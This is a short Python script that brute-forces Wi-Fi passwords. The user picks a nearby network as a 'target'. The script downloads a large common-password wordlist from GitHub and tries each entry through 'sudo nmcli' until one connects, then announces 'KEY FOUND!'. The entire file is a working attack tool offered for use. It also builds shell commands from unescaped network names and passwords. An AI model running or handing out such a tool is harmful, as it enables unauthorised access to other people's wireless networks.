import os
from ssid import start
import urllib.request
import sys
import time

# service NetworkManager restart

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    
    
r = os.popen("whoami").read()
if (r.strip() != "root"):
	print("Run it as root.")

try:
	url = "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-100000.txt"
	passwords = urllib.request.urlopen(url)
except:
	sys.exit(bcolors.FAIL+"Fetch failed. Check internet status."+bcolors.ENDC)


networks = start(1)

print("Select a target: \n")
for i in range(len(networks)):
	print(str(i+1)+". "+networks[i])
	
inp = int(input("\nEnter number of target: "))
selected_network = networks[inp-1]

if (inp <= len(networks)):
	print("\nTarget "+selected_network+" selected...\n")
	
	for password in passwords:
		# necessary due to NetworkManager restart after unsuccessful attempt at login
		
		password = password.strip()
	
		decoded_line = password.decode("utf-8")	
		print(bcolors.HEADER+"** TESTING **: with password '"+decoded_line+"'"+bcolors.ENDC)	
		
		if (len(decoded_line) >= 8):
			time.sleep(3)
		
			creds = os.popen("sudo nmcli dev wifi connect "+selected_network+" password "+decoded_line).read()
			# print(creds)
		
			if ("Error: " in creds.strip()):
				print(bcolors.FAIL+"** TESTING **: password '"+decoded_line+"' failed."+bcolors.ENDC)
			else:
				sys.exit(bcolors.OKGREEN+"** KEY FOUND! **: password '"+decoded_line+"' succeeded."+bcolors.ENDC)
		else:
			print(bcolors.OKCYAN+"** TESTING **: password '"+decoded_line+"' too short, passing."+bcolors.ENDC)
			
			
	print(bcolors.FAIL+"** RESULTS **: All passwords failed :("+bcolors.ENDC)
else:
	print("Invalid selection.")